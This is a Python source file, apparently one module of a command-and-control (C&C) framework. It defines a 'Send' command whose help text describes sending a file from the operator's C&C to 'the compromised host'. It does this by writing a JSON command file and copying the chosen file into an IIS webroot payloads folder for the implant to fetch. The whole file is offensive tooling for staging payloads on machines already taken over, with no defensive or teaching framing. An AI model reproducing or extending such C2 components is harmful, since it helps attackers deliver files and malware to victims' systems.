from command import Command
from shutil import copyfile
from colorama import Fore
import os
import json

class Send (Command): 

	__payloads = "C:\\inetpub\\wwwroot\\final\\payloads\\"
		 		  

	def printHelp(self):

		helpstr = """\n Send a file from your C&C to the compromised host.
	\n ** USAGE **: send <file to send> <destination path> 
		"""

		print(helpstr)

	def writeCommandInFile(self, command, prevId, nextId, filePath):
		if len(command) == 0:
			content = {}
			content['NextId'] = nextId
			content['NextAuth'] = ""
			content['Commands'] = command
			with open(filePath, 'w') as f:
				json.dump(content, f)
			return

		path = command[0]
		command[0] = "send"

		content = {}
		content['NextId'] = nextId
		content['NextAuth'] = ""
		content['Commands'] = command
		with open(filePath, 'w') as f:
			json.dump(content, f)
		

		finalPath = self.__payloads + nextId
		copyfile(path, finalPath)

	def executeCommand(self, cmdSpl, prevId, nextId, filePath):

		if cmdSpl[0] == 'help':
			self.printHelp()
		else:
			
						
			if not os.path.isfile(cmdSpl[0]):
				print(Fore.RED + "File not found.")
				self.writeCommandInFile([], prevId, nextId, filePath)
				return False	
						
			self.printMessage()
			#command = self.parseArgs(None, cmdSpl, None)
			self.writeCommandInFile(cmdSpl, prevId, nextId, filePath)
			#os.system(command) 
			return True
